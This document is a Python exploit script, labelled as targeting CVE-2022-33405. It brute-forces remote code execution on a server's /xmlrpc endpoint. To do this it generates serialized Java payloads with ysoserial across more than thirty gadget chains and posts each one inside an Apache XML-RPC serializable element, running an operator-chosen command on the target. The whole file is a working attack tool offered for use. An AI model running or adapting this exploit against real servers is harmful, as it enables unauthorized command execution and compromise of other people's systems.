import requests
import os  
import argparse
from colorama import Fore

payloads = [
    "AspectJWeaver",
    "URLDNS",
    "BeanShell1",
    "C3P0",
    "Click1",
    "Clojure",
    "CommonsBeanutils1",
    "CommonsCollections1",
    "CommonsCollections2",
    "CommonsCollections3",
    "CommonsCollections4",
    "CommonsCollections5",
    "CommonsCollections6",
    "CommonsCollections7",
    "FileUpload1",
    "Groovy1",
    "Hibernate1",
    "Hibernate2",
    "JBossInterceptors1",
    "JRMPClient",
    "JRMPListener",
    "JSON1",
    "JavassistWeld1",
    "Jdk7u21",
    "Jython1",
    "MozillaRhino1",
    "MozillaRhino2",
    "Myfaces1",
    "Myfaces2",
    "ROME",
    "Spring1",
    "Spring2",
    "Vaadin1",
    "Wicket1"
]







print('CVE-2022-33405 - Engines RCE exploit :)')
parser = argparse.ArgumentParser(description='')
parser.add_argument('-u', '--url', help='URL of the server', required=True)
parser.add_argument('-j', '--jar', help='Path to the YSoserial jar', required=True)
parser.add_argument('-c', '--command', help='Command to execute on server', required=True)

args = parser.parse_args()
url = args.url
if url[-1:] == '/':
    url = url[:-1]
jar = args.jar
command_payload = args.command

requests.packages.urllib3.disable_warnings()

def ysoserial(command_payload, jar,mode):
    #edit here
     o =  os.popen(f'java -jar {jar} {mode} "{command_payload}" | base64 | tr -d "\\n"').read()
     print(f'[+] Payload: {o}')
     return o
    
def make_request(url, ysoserial_payload):
    url = f"{url}/xmlrpc"
    headers = {"Connection": "close", "Content-Type": "application/xml"}
    data = f'<?xml version="1.0"?><methodCall><methodName>big0us</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">{ysoserial_payload}</serializable></value></member></struct></value></param></params>'
    r = requests.post(url, headers=headers, data=data, verify=False)
    
    if 'java.lang.reflect.InvocationTargetException' in r.text:
        print(Fore.LIGHTGREEN_EX,f'\n[+] Successfully executed command')
        
    else:
        print(Fore.LIGHTRED_EX,f'\n[-] Failed to execute command')
        print(Fore.CYAN,f'[-] Response: {r.text}')


print(f'[+] Command: {command_payload}')

for mode in payloads:
    print(f'\n\n[+] Mode: {mode}')
    ysoserial_payload = ysoserial(command_payload, jar,mode)
    make_request(url, ysoserial_payload)
